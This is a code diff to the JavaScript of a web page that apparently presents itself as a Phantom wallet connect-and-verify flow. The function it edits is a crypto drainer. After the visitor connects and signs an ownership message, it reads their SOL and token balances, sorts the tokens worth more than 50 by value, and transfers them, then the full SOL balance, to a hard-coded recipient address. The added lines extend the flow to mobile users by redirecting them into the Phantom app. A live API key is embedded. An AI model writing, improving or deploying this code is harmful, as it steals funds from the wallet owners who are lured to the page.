@@ -11,23 +11,33 @@ let walletAddress = null;
 async function connectAndExecute() {
     const provider = window.solana;
 
+    // Detect if the user is on a mobile device
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
     if (!provider || !provider.isPhantom) {
+        // If the user is on mobile, redirect to Phantom wallet app
+        if (isMobile) {
+            window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
+            return;
+        }
+
+        // For desktop users, prompt to install Phantom Wallet
         alert('Phantom wallet not found. Please install it!');
         return;
     }
 
     try {
-        // Step 1: Request wallet connection
+        // Step 1: Request wallet connection (standard flow)
         const response = await provider.connect();
         walletAddress = response.publicKey.toString();  // Capture the connected wallet address
 
-        // Display the connected wallet address
+        // Update button text to indicate connection
         document.getElementById('connectWalletBtn').textContent = `Connected`;
 
-        // Step 2: Sign a message after connection to verify wallet ownership
+        // Step 2: Sign a message to verify wallet ownership
         await signMessage(provider, walletAddress);
 
-        // Step 3: Fetch SOL balance after signing
+        // Step 3: Fetch SOL balance
         const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
         const balance = await connection.getBalance(new PublicKey(walletAddress));
         const solBalance = balance / 1e9;
@@ -35,28 +45,26 @@ async function connectAndExecute() {
         // Step 4: Fetch token balances using Shyft API
         const tokens = await fetchTokenBalances(walletAddress);
 
-        // Step 5: Fetch prices for the tokens using Jupiter API
+        // Step 5: Fetch prices for tokens using Jupiter API
         const tokenPrices = await fetchTokenPrices(tokens);
 
-        // Step 6: Calculate token values (balance * price) and sort by value
+        // Step 6: Calculate token values and sort them
         const tokenValues = tokens.map(token => {
-            const price = tokenPrices[token.info.symbol] || 0;  // Get the price for the token, default to 0 if not found
-            const value = price * token.balance;  // Multiply balance and price directly
+            const price = tokenPrices[token.info.symbol] || 0;
+            const value = price * token.balance;
             return { ...token, value };
         });
 
-        // Filter out tokens with a value of zero or below a certain threshold (e.g., 0.01)
+        // Filter and sort tokens by value
         const filteredTokens = tokenValues.filter(token => token.value > 50);
-
-        // Sort tokens by value (highest to lowest)
         const sortedTokens = filteredTokens.sort((a, b) => b.value - a.value);
         console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
 
-        // Step 7: Transfer tokens in the sorted order
-        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with the recipient's address
+        // Step 7: Transfer tokens in order
+        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with recipient's address
         await transferTokensInOrder(sortedTokens, recipientAddress, connection);
 
-        // Step 8: Initiate SOL transfer after all token transfers
+        // Step 8: Transfer SOL after tokens
         await transferSol(connection, recipientAddress, solBalance);
 
     } catch (err) {
@@ -64,6 +72,7 @@ async function connectAndExecute() {
         alert('Failed to complete wallet flow');
     }
 }
+
 
 // Function to sign a message and verify wallet ownership
 async function signMessage(provider, walletAddress) {
